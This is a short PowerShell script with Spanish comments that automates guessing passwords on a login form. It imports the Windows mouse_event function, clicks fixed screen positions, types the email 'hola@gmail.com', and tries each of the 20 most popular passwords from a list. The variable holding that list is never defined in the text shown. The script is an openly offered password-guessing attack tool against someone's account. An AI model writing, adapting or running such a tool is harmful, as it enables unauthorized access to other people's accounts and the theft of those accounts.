
$MouseEventSig=@'
[DllImport("user32.dll",CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
'@
 
$MouseEvent = Add-Type -memberDefinition $MouseEventSig -name "MouseEventWinApi" -passThru

 


$contador = 0

$contador = 0

#Intentar iniciar sesión con las 20 contraseñas más populares 
while ($contador -lt 20) {
    
    $contraseña = $palabras[$contador]

    #Clica en el usuario e inserta el correo deseado
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(909, 228)
    $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
    $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)

    [System.Windows.Forms.SendKeys]::SendWait('hola@gmail.com')

    
    #Clica en la contraseña y la saca de un archivo txt en el que
    #previamente se han insertado las contraseñas a probar
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(925, 278)
    $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
    $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)

    [System.Windows.Forms.SendKeys]::SendWait($contraseña)

    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(926, 309)
    $MouseEvent::mouse_event(0x00000002, 0, 0, 0, 0)
    $MouseEvent::mouse_event(0x00000004, 0, 0, 0, 0)

    $contador++
}

